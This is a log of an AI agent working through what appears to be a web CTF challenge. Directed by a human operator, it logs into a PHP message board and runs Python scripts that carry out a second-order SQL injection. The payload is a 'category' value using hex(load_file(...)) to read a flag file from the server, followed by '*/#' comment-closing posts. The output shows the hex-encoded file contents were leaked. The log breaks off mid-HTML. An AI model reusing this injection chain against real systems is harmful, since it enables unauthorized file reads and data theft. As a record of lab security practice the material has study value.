user_proxy (to code_exec_agent):

The task is: From the website at http://47.251.44.45:40632/, find the string stored in the current database table, which is formatted as "flag{{}}". First, visit http://47.251.44.45:40632/.

--------------------------------------------------------------------------------
**********要执行的代码**********
```python
import requests
from bs4 import BeautifulSoup

url = "http://47.251.44.45:40632/"
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')

print(soup.prettify())
```
**********开始执行代码**********

>>>>>>>> EXECUTING CODE BLOCK 0 (inferred language is python)...
code_exec_agent (to user_proxy):

exitcode: 1 (execution failed)
Code output:
Traceback (most recent call last):
  File "", line 8, in <module>
    print(soup.prettify())
UnicodeEncodeError: 'gbk' codec can't encode character '\xe7' in position 246: illegal multibyte sequence


--------------------------------------------------------------------------------
Provide feedback to code_exec_agent. Press enter to skip and use auto-reply, or type 'exit' to end the conversation: Go to login.php, use username \"zhangwei\" and password \"zhangwei666\" to login.
user_proxy (to code_exec_agent):

Go to login.php, use username \"zhangwei\" and password \"zhangwei666\" to login.

-------------------------------------------------------------------------------- 
**********要执行的代码**********
```python
import requests
from bs4 import BeautifulSoup

login_url = "http://47.251.44.45:40632/login.php"
login_data = {
    "username": "zhangwei",
    "password": "zhangwei666"
}

session = requests.Session()
response = session.post(login_url, data=login_data)

soup = BeautifulSoup(response.text, 'html.parser')
print(soup.prettify())
```
**********开始执行代码**********

>>>>>>>> EXECUTING CODE BLOCK 0 (inferred language is python)...
code_exec_agent (to user_proxy):

exitcode: 1 (execution failed)
Code output:
Traceback (most recent call last):
  File "", line 14, in <module>
    print(soup.prettify())
UnicodeEncodeError: 'gbk' codec can't encode character '\xe7' in position 246: illegal multibyte sequence


--------------------------------------------------------------------------------
Provide feedback to code_exec_agent. Press enter to skip and use auto-reply, or type 'exit' to end the conversation: Go to write_do.php?do=write, send a post request, use test2 as 'title', ',content=(hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/* as 'category', 'test2' as 'content'.
user_proxy (to code_exec_agent):

Go to write_do.php?do=write, send a post request, use test2 as 'title', ',content=(hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/* as 'category', 'test2' as 'content'.

--------------------------------------------------------------------------------
**********要执行的代码**********
```python
import requests

url = "http://47.251.44.45:40632/write_do.php?do=write"
data = {
    "title": "test2",
    "category": ",content=(hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*",
    "content": "test2"
}

session = requests.Session()
response = session.post(url, data=data)

print(response.text)
```
**********开始执行代码**********

>>>>>>>> EXECUTING CODE BLOCK 0 (inferred language is python)...
code_exec_agent (to user_proxy):

exitcode: 0 (execution succeeded)
Code output:
<!doctype html>
<html class="signin no-js" lang="">
<head>

    <meta charset="utf-8">
    <title>Login</title>

    <link rel="stylesheet" href="vendor/offline/theme.css">
    <link rel="stylesheet" href="vendor/pace/theme.css">


    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/font-awesome.min.css">
    <link rel="stylesheet" href="css/animate.min.css">


    <link rel="stylesheet" href="css/skins/palette.1.css" id="skin">
    <link rel="stylesheet" href="css/fonts/style.1.css" id="font">
    <link rel="stylesheet" href="css/main.css">

    <script src="vendor/modernizr.js"></script>
</head>

<body class="bg-color center-wrapper">
    <div class="center-content">
        <div class="row">
            <div class="col-xs-10 col-xs-offset-1 col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4">
                <section class="panel panel-default">
                    <header class="panel-heading">Sign in</header>
                    <div class="bg-white user pd-md">
                        <form role="form" action="login.php" method="post">
                            <input name="username" type="text" class="form-control mg-b-sm" placeholder="zhangwei" autofocus>
                            <input name="password" type="password" class="form-control" placeholder="zhangwei***">
                            <div class="text-right mg-b-sm mg-t-sm"></div>
                            <button class="btn btn-info btn-block" type="submit">Sign in</button>
                        </form>
                    </div>
                </section>
            </div>
        </div>
    </div>
</body>
</html>



--------------------------------------------------------------------------------
Provide feedback to code_exec_agent. Press enter to skip and use auto-reply, or type 'exit' to end the conversation: Go to write_do.php?do=write, send post requests, use */# as 'content', from 1 to 5 as 'bo_id'.
user_proxy (to code_exec_agent):

Go to write_do.php?do=write, send post requests, use */# as 'content', from 1 to 5 as 'bo_id'.

--------------------------------------------------------------------------------
**********要执行的代码**********
```python
import requests

url = "http://47.251.44.45:40632/write_do.php?do=write"
data_list = [
    {"title": "fix", "category": "test", "content": "*/#", "bo_id": i} for i in range(1, 6)
]

session = requests.Session()
responses = []
for data in data_list:
    response = session.post(url, data=data)
    responses.append((data["bo_id"], response.text))

for res in responses:
    print(f"bo_id {res[0]}: {res[1]}")
```
**********开始执行代码**********

>>>>>>>> EXECUTING CODE BLOCK 0 (inferred language is python)...
code_exec_agent (to user_proxy):

exitcode: 0 (execution succeeded)
Code output:
bo_id 1: <!doctype html>
<html class="signin no-js" lang="">
<head>

    <meta charset="utf-8">
    <title>Login</title>

    <link rel="stylesheet" href="vendor/offline/theme.css">
    <link rel="stylesheet" href="vendor/pace/theme.css">


    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/font-awesome.min.css">
    <link rel="stylesheet" href="css/animate.min.css">


    <link rel="stylesheet" href="css/skins/palette.1.css" id="skin">
    <link rel="stylesheet" href="css/fonts/style.1.css" id="font">
    <link rel="stylesheet" href="css/main.css">

    <script src="vendor/modernizr.js"></script>
</head>

<body class="bg-color center-wrapper">
    <div class="center-content">
        <div class="row">
            <div class="col-xs-10 col-xs-offset-1 col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4">
                <section class="panel panel-default">
                    <header class="panel-heading">Sign in</header>
                    <div class="bg-white user pd-md">
                        <form role="form" action="login.php" method="post">
                            <input name="username" type="text" class="form-control mg-b-sm" placeholder="zhangwei" autofocus>
                            <input name="password" type="password" class="form-control" placeholder="zhangwei***">
                            <div class="text-right mg-b-sm mg-t-sm"></div>
                            <button class="btn btn-info btn-block" type="submit">Sign in</button>
                        </form>
                    </div>
                </section>
            </div>
        </div>
    </div>
</body>
</html>

bo_id 2: <!doctype html>
<html class="signin no-js" lang="">
<head>

    <meta charset="utf-8">
    <title>Login</title>

    <link rel="stylesheet" href="vendor/offline/theme.css">
    <link rel="stylesheet" href="vendor/pace/theme.css">


    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/font-awesome.min.css">
    <link rel="stylesheet" href="css/animate.min.css">


    <link rel="stylesheet" href="css/skins/palette.1.css" id="skin">
    <link rel="stylesheet" href="css/fonts/style.1.css" id="font">
    <link rel="stylesheet" href="css/main.css">

    <script src="vendor/modernizr.js"></script>
</head>

<body class="bg-color center-wrapper">
    <div class="center-content">
        <div class="row">
            <div class="col-xs-10 col-xs-offset-1 col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4">
                <section class="panel panel-default">
                    <header class="panel-heading">Sign in</header>
                    <div class="bg-white user pd-md">
                        <form role="form" action="login.php" method="post">
                            <input name="username" type="text" class="form-control mg-b-sm" placeholder="zhangwei" autofocus>
                            <input name="password" type="password" class="form-control" placeholder="zhangwei***">
                            <div class="text-right mg-b-sm mg-t-sm"></div>
                            <button class="btn btn-info btn-block" type="submit">Sign in</button>
                        </form>
                    </div>
                </section>
            </div>
        </div>
    </div>
</body>
</html>

bo_id 3: <!doctype html>
<html class="signin no-js" lang="">
<head>

    <meta charset="utf-8">
    <title>Login</title>

    <link rel="stylesheet" href="vendor/offline/theme.css">
    <link rel="stylesheet" href="vendor/pace/theme.css">


    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/font-awesome.min.css">
    <link rel="stylesheet" href="css/animate.min.css">


    <link rel="stylesheet" href="css/skins/palette.1.css" id="skin">
    <link rel="stylesheet" href="css/fonts/style.1.css" id="font">
    <link rel="stylesheet" href="css/main.css">

    <script src="vendor/modernizr.js"></script>
</head>

<body class="bg-color center-wrapper">
    <div class="center-content">
        <div class="row">
            <div class="col-xs-10 col-xs-offset-1 col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4">
                <section class="panel panel-default">
                    <header class="panel-heading">Sign in</header>
                    <div class="bg-white user pd-md">
                        <form role="form" action="login.php" method="post">
                            <input name="username" type="text" class="form-control mg-b-sm" placeholder="zhangwei" autofocus>
                            <input name="password" type="password" class="form-control" placeholder="zhangwei***">
                            <div class="text-right mg-b-sm mg-t-sm"></div>
                            <button class="btn btn-info btn-block" type="submit">Sign in</button>
                        </form>
                    </div>
                </section>
            </div>
        </div>
    </div>
</body>
</html>

bo_id 4: <!doctype html>
<html class="signin no-js" lang="">
<head>

    <meta charset="utf-8">
    <title>Login</title>

    <link rel="stylesheet" href="vendor/offline/theme.css">
    <link rel="stylesheet" href="vendor/pace/theme.css">


    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/font-awesome.min.css">
    <link rel="stylesheet" href="css/animate.min.css">


    <link rel="stylesheet" href="css/skins/palette.1.css" id="skin">
    <link rel="stylesheet" href="css/fonts/style.1.css" id="font">
    <link rel="stylesheet" href="css/main.css">

    <script src="vendor/modernizr.js"></script>
</head>

<body class="bg-color center-wrapper">
    <div class="center-content">
        <div class="row">
            <div class="col-xs-10 col-xs-offset-1 col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4">
                <section class="panel panel-default">
                    <header class="panel-heading">Sign in</header>
                    <div class="bg-white user pd-md">
                        <form role="form" action="login.php" method="post">
                            <input name="username" type="text" class="form-control mg-b-sm" placeholder="zhangwei" autofocus>
                            <input name="password" type="password" class="form-control" placeholder="zhangwei***">
                            <div class="text-right mg-b-sm mg-t-sm"></div>
                            <button class="btn btn-info btn-block" type="submit">Sign in</button>
                        </form>
                    </div>
                </section>
            </div>
        </div>
    </div>
</body>
</html>

bo_id 5: <!doctype html>
<html class="signin no-js" lang="">
<head>

    <meta charset="utf-8">
    <title>Login</title>

    <link rel="stylesheet" href="vendor/offline/theme.css">
    <link rel="stylesheet" href="vendor/pace/theme.css">


    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/font-awesome.min.css">
    <link rel="stylesheet" href="css/animate.min.css">


    <link rel="stylesheet" href="css/skins/palette.1.css" id="skin">
    <link rel="stylesheet" href="css/fonts/style.1.css" id="font">
    <link rel="stylesheet" href="css/main.css">

    <script src="vendor/modernizr.js"></script>
</head>

<body class="bg-color center-wrapper">
    <div class="center-content">
        <div class="row">
            <div class="col-xs-10 col-xs-offset-1 col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4">
                <section class="panel panel-default">
                    <header class="panel-heading">Sign in</header>
                    <div class="bg-white user pd-md">
                        <form role="form" action="login.php" method="post">
                            <input name="username" type="text" class="form-control mg-b-sm" placeholder="zhangwei" autofocus>
                            <input name="password" type="password" class="form-control" placeholder="zhangwei***">
                            <div class="text-right mg-b-sm mg-t-sm"></div>
                            <button class="btn btn-info btn-block" type="submit">Sign in</button>
                        </form>
                    </div>
                </section>
            </div>
        </div>
    </div>
</body>
</html>



--------------------------------------------------------------------------------
Provide feedback to code_exec_agent. Press enter to skip and use auto-reply, or type 'exit' to end the conversation: Go to comment.php?id=, id from 1 
to 5, get contents of '\u7559\u8a00'\nuse python request session to finish the above steps, in the forth step, remember use utf-8 when you need print 
the response.
user_proxy (to code_exec_agent):

Go to comment.php?id=, id from 1 to 5, get contents of '\u7559\u8a00'\nuse python request session to finish the above steps, in the forth step, remember use utf-8 when you need print the response.

--------------------------------------------------------------------------------
**********要执行的代码**********
```python
import requests

base_url = "http://47.251.44.45:40632/comment.php?id="
ids = range(1, 6)

session = requests.Session()
responses = []
for id in ids:
    url = base_url + str(id)
    response = session.get(url)
    responses.append((id, response.text))

for res in responses:
    print(f"id {res[0]}: {res[1].encode('utf-8')}")   
```
**********开始执行代码**********

>>>>>>>> EXECUTING CODE BLOCK 0 (inferred language is python)...
code_exec_agent (to user_proxy):

exitcode: 0 (execution succeeded)
Code output:
id 1: b'<!doctype html>\n<html class="no-js" lang="">\n\n<head>\n\n    <meta charset="utf-8">\n    <meta name="description" content="">\n    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1">\n\n    <title>\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80\xc3\xa6\xc2\x9d\xc2\xbf</title>\n\n<style type="text/css"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel="stylesheet" href="/vendor/bootstrap-select/bootstrap-select.css">\n    <link rel="stylesheet" href="/vendor/dropzone/dropzone.css">\n    <link rel="stylesheet" href="/vendor/slider/slider.css">\n    <link rel="stylesheet" href="/vendor/bootstrap-datepicker/datepicker.css">\n    <link rel="stylesheet" href="/vendor/timepicker/jquery.timepicker.css">\n    <link rel="stylesheet" href="/vendor/offline/theme.css">\n    <link rel="stylesheet" href="/vendor/pace/theme.css">\n\n\n    <link rel="stylesheet" href="/bootstrap/css/bootstrap.min.css">\n    <link rel="stylesheet" href="/css/font-awesome.min.css">\n    <link rel="stylesheet" href="/css/animate.min.css">\n\n    <link rel="stylesheet" href="/css/panel.css">\n\n    <link rel="stylesheet" href="/css/skins/palette.1.css" id="skin">\n    <link rel="stylesheet" href="/css/fonts/style.1.css" id="font">\n    <link rel="stylesheet" href="/css/main.css">\n\n    <script src="/vendor/modernizr.js"></script>\n</head>\n\n<body>\n            <section class="main-content">\n                <div class="content-wrap">\n                    <div class="row">\n                        <div class="col-lg-12">\n                            <div class="tab-content ">\n                                <section class="tab-pane active">\n                                            <section class="panel">\n        
                                        <header class="panel-heading"><b></b></header>\n                                                <div class="panel-body">\n                                                    <form class="form-horizontal bordered-group" role="form" method="post" action="./write_do.php?do=comment" onsubmit="return submit_check()">\n                                                        <div class="form-group">\n
                                               <label class="col-sm-2 control-label">\xc3\xa6\xc2\xad\xc2\xa3\xc3\xa6\xc2\x96\xc2\x87</label>\n       
                                                     <div class="col-sm-5">\n                                                                <p>a\',content=(select hex(load_file(\'/var/www/html/flag_8946e1ff1ee3e40f.php\'))),/*</p>\n                                                            </div>\n                                                        </div>\n<div class="form-group"><label class="col-sm-2 control-label">\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80</label><div class="col-sm-5"><p>*/#</p></div></div>                                                        <div class="form-group">\n                                                            <label class="col-sm-2 control-label">\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80</label>\n                                                            <div class="col-sm-5">\n   
                                                             <textarea name="content" class="form-control" rows="8"></textarea>\n
                                           <input hidden name="bo_id" value="1">\n                                                            </div>\n                                                        </div>\n                                                        <div class="form-group">\n    
                                                        <label class="col-sm-2 control-label"></label>\n
              <div class="col-sm-10">\n                                                                <button type="submit" class="btn btn-success"><i class="fa fa-check"></i>\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4</button>\n                                                            </div>\n                                                        </div>\n                                                    </form>\n
                          </div>\n                                            </section>\n                                </section>\n
            </div>\n                        </div>\n                    </div>\n                </div>\n        </section>\n\n\n    <script src="/vendor/jquery-1.11.1.min.js"></script>\n    <script src="/bootstrap/js/bootstrap.js"></script>\n    <script src="/vendor/jquery.easing.min.js"></script>\n    <script src="/vendor/jquery.placeholder.js"></script>\n    <script src="/vendor/fastclick.js"></script>\n\n\n    <script src="/vendor/bootstrap-select/bootstrap-select.js"></script>\n    <script src="/vendor/dropzone/dropzone.js"></script>\n    <script src="/vendor/parsley.min.js"></script>\n   
 <script src="/vendor/fuelux/checkbox.js"></script>\n    <script src="/vendor/fuelux/radio.js"></script>\n    <script src="/vendor/fuelux/wizard.js"></script>\n    <script src="/vendor/fuelux/pillbox.js"></script>\n    <script src="/vendor/fuelux/spinner.js"></script>\n    <script src="/vendor/slider/bootstrap-slider.js"></script>\n    <script src="/vendor/bootstrap-datepicker/bootstrap-datepicker.js"></script>\n    <script src="/vendor/wysiwyg/jquery.hotkeys.js"></script>\n    <script src="/vendor/wysiwyg/bootstrap-wysiwyg.js"></script>\n    <script src="/vendor/switchery/switchery.js"></script>\n    <script src="/vendor/timepicker/jquery.timepicker.js"></script>\n    <script src="/vendor/offline/offline.min.js"></script>\n    <script src="/vendor/pace/pace.min.js"></script>\n\n    <script src="/vendor/jquery.slimscroll.js"></script>\n    <script src="/js/off-canvas.js"></script>\n    <script src="/js/main.js"></script>\n\n    <script src="/js/panel.js"></script>\n    <script src="/js/forms.js"></script>\n<script language="javascript">  \nfunction submit_check(){\n    var gnl=confirm("\xc3\xa7\xc2\xa1\xc2\xae\xc3\xa5\xc2\xae\xc2\x9a\xc3\xa8\xc2\xa6\xc2\x81\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4?");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n</body>\n</html>\n'
id 2: b'<!doctype html>\n<html class="no-js" lang="">\n\n<head>\n\n    <meta charset="utf-8">\n    <meta name="description" content="">\n    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1">\n\n    <title>\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80\xc3\xa6\xc2\x9d\xc2\xbf</title>\n\n<style type="text/css"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel="stylesheet" href="/vendor/bootstrap-select/bootstrap-select.css">\n    <link rel="stylesheet" href="/vendor/dropzone/dropzone.css">\n    <link rel="stylesheet" href="/vendor/slider/slider.css">\n    <link rel="stylesheet" href="/vendor/bootstrap-datepicker/datepicker.css">\n    <link rel="stylesheet" href="/vendor/timepicker/jquery.timepicker.css">\n    <link rel="stylesheet" href="/vendor/offline/theme.css">\n    <link rel="stylesheet" href="/vendor/pace/theme.css">\n\n\n    <link rel="stylesheet" href="/bootstrap/css/bootstrap.min.css">\n    <link rel="stylesheet" href="/css/font-awesome.min.css">\n    <link rel="stylesheet" href="/css/animate.min.css">\n\n    <link rel="stylesheet" href="/css/panel.css">\n\n    <link rel="stylesheet" href="/css/skins/palette.1.css" id="skin">\n    <link rel="stylesheet" href="/css/fonts/style.1.css" id="font">\n    <link rel="stylesheet" href="/css/main.css">\n\n    <script src="/vendor/modernizr.js"></script>\n</head>\n\n<body>\n            <section class="main-content">\n                <div class="content-wrap">\n                    <div class="row">\n                        <div class="col-lg-12">\n                            <div class="tab-content ">\n                                <section class="tab-pane active">\n                                            <section class="panel">\n        
                                        <header class="panel-heading"><b></b></header>\n                                                <div class="panel-body">\n                                                    <form class="form-horizontal bordered-group" role="form" method="post" action="./write_do.php?do=comment" onsubmit="return submit_check()">\n                                                        <div class="form-group">\n
                                               <label class="col-sm-2 control-label">\xc3\xa6\xc2\xad\xc2\xa3\xc3\xa6\xc2\x96\xc2\x87</label>\n       
                                                     <div class="col-sm-5">\n                                                                <p>content</p>\n                                                            </div>\n                                                        </div>\n<div class="form-group"><label class="col-sm-2 control-label">\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80</label><div class="col-sm-5"><p>3C3F7068700A0924666C61673D22666C61677B666C61675F746573747D223B0A3F3E0A</p></div></div>                                                        <div class="form-group">\n                                                            <label class="col-sm-2 control-label">\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80</label>\n                                                            <div class="col-sm-5">\n
                                                    <textarea name="content" class="form-control" rows="8"></textarea>\n
                                  <input hidden name="bo_id" value="2">\n                                                            </div>\n
                                               </div>\n                                                        <div class="form-group">\n
                                               <label class="col-sm-2 control-label"></label>\n
     <div class="col-sm-10">\n                                                                <button type="submit" class="btn btn-success"><i class="fa fa-check"></i>\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4</button>\n                                                            </div>\n      
                                                  </div>\n                                                    </form>\n
                 </div>\n                                            </section>\n                                </section>\n
   </div>\n                        </div>\n                    </div>\n                </div>\n        </section>\n\n\n    <script src="/vendor/jquery-1.11.1.min.js"></script>\n    <script src="/bootstrap/js/bootstrap.js"></script>\n    <script src="/vendor/jquery.easing.min.js"></script>\n    <script src="/vendor/jquery.placeholder.js"></script>\n    <script src="/vendor/fastclick.js"></script>\n\n\n    <script src="/vendor/bootstrap-select/bootstrap-select.js"></script>\n    <script src="/vendor/dropzone/dropzone.js"></script>\n    <script src="/vendor/parsley.min.js"></script>\n    <script 
src="/vendor/fuelux/checkbox.js"></script>\n    <script src="/vendor/fuelux/radio.js"></script>\n    <script src="/vendor/fuelux/wizard.js"></script>\n    <script src="/vendor/fuelux/pillbox.js"></script>\n    <script src="/vendor/fuelux/spinner.js"></script>\n    <script src="/vendor/slider/bootstrap-slider.js"></script>\n    <script src="/vendor/bootstrap-datepicker/bootstrap-datepicker.js"></script>\n    <script src="/vendor/wysiwyg/jquery.hotkeys.js"></script>\n    <script src="/vendor/wysiwyg/bootstrap-wysiwyg.js"></script>\n    <script src="/vendor/switchery/switchery.js"></script>\n    
<script src="/vendor/timepicker/jquery.timepicker.js"></script>\n    <script src="/vendor/offline/offline.min.js"></script>\n    <script src="/vendor/pace/pace.min.js"></script>\n\n    <script src="/vendor/jquery.slimscroll.js"></script>\n    <script src="/js/off-canvas.js"></script>\n    <script src="/js/main.js"></script>\n\n    <script src="/js/panel.js"></script>\n    <script src="/js/forms.js"></script>\n<script language="javascript">  \nfunction submit_check(){\n    var gnl=confirm("\xc3\xa7\xc2\xa1\xc2\xae\xc3\xa5\xc2\xae\xc2\x9a\xc3\xa8\xc2\xa6\xc2\x81\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4?");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n</body>\n</html>\n' 
id 3: b'<!doctype html>\n<html class="no-js" lang="">\n\n<head>\n\n    <meta charset="utf-8">\n    <meta name="description" content="">\n    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1">\n\n    <title>\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80\xc3\xa6\xc2\x9d\xc2\xbf</title>\n\n<style type="text/css"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel="stylesheet" href="/vendor/bootstrap-select/bootstrap-select.css">\n    <link rel="stylesheet" href="/vendor/dropzone/dropzone.css">\n    <link rel="stylesheet" href="/vendor/slider/slider.css">\n    <link rel="stylesheet" href="/vendor/bootstrap-datepicker/datepicker.css">\n    <link rel="stylesheet" href="/vendor/timepicker/jquery.timepicker.css">\n    <link rel="stylesheet" href="/vendor/offline/theme.css">\n    <link rel="stylesheet" href="/vendor/pace/theme.css">\n\n\n    <link rel="stylesheet" href="/bootstrap/css/bootstrap.min.css">\n    <link rel="stylesheet" href="/css/font-awesome.min.css">\n    <link rel="stylesheet" href="/css/animate.min.css">\n\n    <link rel="stylesheet" href="/css/panel.css">\n\n    <link rel="stylesheet" href="/css/skins/palette.1.css" id="skin">\n    <link rel="stylesheet" href="/css/fonts/style.1.css" id="font">\n    <link rel="stylesheet" href="/css/main.css">\n\n    <script src="/vendor/modernizr.js"></script>\n</head>\n\n<body>\n            <section class="main-content">\n                <div class="content-wrap">\n                    <div class="row">\n                        <div class="col-lg-12">\n                            <div class="tab-content ">\n                                <section class="tab-pane active">\n                                            <section class="panel">\n        
                                        <header class="panel-heading"><b></b></header>\n                                                <div class="panel-body">\n                                                    <form class="form-horizontal bordered-group" role="form" method="post" action="./write_do.php?do=comment" onsubmit="return submit_check()">\n                                                        <div class="form-group">\n
                                               <label class="col-sm-2 control-label">\xc3\xa6\xc2\xad\xc2\xa3\xc3\xa6\xc2\x96\xc2\x87</label>\n       
                                                     <div class="col-sm-5">\n                                                                <p>content</p>\n                                                            </div>\n                                                        </div>\n<div class="form-group"><label class="col-sm-2 control-label">\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80</label><div class="col-sm-5"><p>ctf</p></div></div>                                                        <div class="form-group">\n                                                            <label 
class="col-sm-2 control-label">\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80</label>\n
                                               <div class="col-sm-5">\n                                                                <textarea name="content" class="form-control" rows="8"></textarea>\n                                                                <input hidden name="bo_id" value="3">\n                                                            </div>\n                                                        </div>\n
                                            <div class="form-group">\n                                                            <label class="col-sm-2 control-label"></label>\n                                                            <div class="col-sm-10">\n
                           <button type="submit" class="btn btn-success"><i class="fa fa-check"></i>\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4</button>\n                                                            </div>\n                                                        </div>\n
                                           </form>\n                                                </div>\n
  </section>\n                                </section>\n                            </div>\n                        </div>\n                    </div>\n                </div>\n        </section>\n\n\n    <script src="/vendor/jquery-1.11.1.min.js"></script>\n    <script src="/bootstrap/js/bootstrap.js"></script>\n    <script src="/vendor/jquery.easing.min.js"></script>\n    <script src="/vendor/jquery.placeholder.js"></script>\n    <script src="/vendor/fastclick.js"></script>\n\n\n    <script src="/vendor/bootstrap-select/bootstrap-select.js"></script>\n    <script src="/vendor/dropzone/dropzone.js"></script>\n    <script src="/vendor/parsley.min.js"></script>\n    <script src="/vendor/fuelux/checkbox.js"></script>\n    <script src="/vendor/fuelux/radio.js"></script>\n    <script src="/vendor/fuelux/wizard.js"></script>\n    <script src="/vendor/fuelux/pillbox.js"></script>\n    <script src="/vendor/fuelux/spinner.js"></script>\n    <script src="/vendor/slider/bootstrap-slider.js"></script>\n    <script src="/vendor/bootstrap-datepicker/bootstrap-datepicker.js"></script>\n    <script src="/vendor/wysiwyg/jquery.hotkeys.js"></script>\n    <script src="/vendor/wysiwyg/bootstrap-wysiwyg.js"></script>\n    <script src="/vendor/switchery/switchery.js"></script>\n    <script src="/vendor/timepicker/jquery.timepicker.js"></script>\n  
  <script src="/vendor/offline/offline.min.js"></script>\n    <script src="/vendor/pace/pace.min.js"></script>\n\n    <script src="/vendor/jquery.slimscroll.js"></script>\n    <script src="/js/off-canvas.js"></script>\n    <script src="/js/main.js"></script>\n\n    <script src="/js/panel.js"></script>\n    <script src="/js/forms.js"></script>\n<script language="javascript">  \nfunction submit_check(){\n    var gnl=confirm("\xc3\xa7\xc2\xa1\xc2\xae\xc3\xa5\xc2\xae\xc2\x9a\xc3\xa8\xc2\xa6\xc2\x81\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4?");\n    if (gnl==true){\n        return true;\n    
}\n    else{\n        return false;\n    }\n    }\n</script> \n</body>\n</html>\n'
id 4: b'<!doctype html>\n<html class="no-js" lang="">\n\n<head>\n\n    <meta charset="utf-8">\n    <meta name="description" content="">\n    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1">\n\n    <title>\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80\xc3\xa6\xc2\x9d\xc2\xbf</title>\n\n<style type="text/css"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel="stylesheet" href="/vendor/bootstrap-select/bootstrap-select.css">\n    <link rel="stylesheet" href="/vendor/dropzone/dropzone.css">\n    <link rel="stylesheet" href="/vendor/slider/slider.css">\n    <link rel="stylesheet" href="/vendor/bootstrap-datepicker/datepicker.css">\n    <link rel="stylesheet" href="/vendor/timepicker/jquery.timepicker.css">\n    <link rel="stylesheet" href="/vendor/offline/theme.css">\n    <link rel="stylesheet" href="/vendor/pace/theme.css">\n\n\n    <link rel="stylesheet" href="/bootstrap/css/bootstrap.min.css">\n    <link rel="stylesheet" href="/css/font-awesome.min.css">\n    <link rel="stylesheet" href="/css/animate.min.css">\n\n    <link rel="stylesheet" href="/css/panel.css">\n\n    <link rel="stylesheet" href="/css/skins/palette.1.css" id="skin">\n    <link rel="stylesheet" href="/css/fonts/style.1.css" id="font">\n    <link rel="stylesheet" href="/css/main.css">\n\n    <script src="/vendor/modernizr.js"></script>\n</head>\n\n<body>\n            <section class="main-content">\n                <div class="content-wrap">\n                    <div class="row">\n                        <div class="col-lg-12">\n                            <div class="tab-content ">\n                                <section class="tab-pane active">\n                                            <section class="panel">\n        
                                        <header class="panel-heading"><b></b></header>\n                                                <div class="panel-body">\n                                                    <form class="form-horizontal bordered-group" role="form" method="post" action="./write_do.php?do=comment" onsubmit="return submit_check()">\n                                                        <div class="form-group">\n
                                               <label class="col-sm-2 control-label">\xc3\xa6\xc2\xad\xc2\xa3\xc3\xa6\xc2\x96\xc2\x87</label>\n       
                                                     <div class="col-sm-5">\n                                                                <p></p>\n                                                            </div>\n                                                        </div>\n
                                      <div class="form-group">\n                                                            <label class="col-sm-2 control-label">\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80</label>\n
                            <div class="col-sm-5">\n                                                                <textarea name="content" class="form-control" rows="8"></textarea>\n                                                                <input hidden name="bo_id" value="4">\n
                                               </div>\n                                                        </div>\n
                         <div class="form-group">\n                                                            <label class="col-sm-2 control-label"></label>\n                                                            <div class="col-sm-10">\n
        <button type="submit" class="btn btn-success"><i class="fa fa-check"></i>\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4</button>\n
                                                  </div>\n                                                        </div>\n
                        </form>\n                                                </div>\n                                            </section>\n     
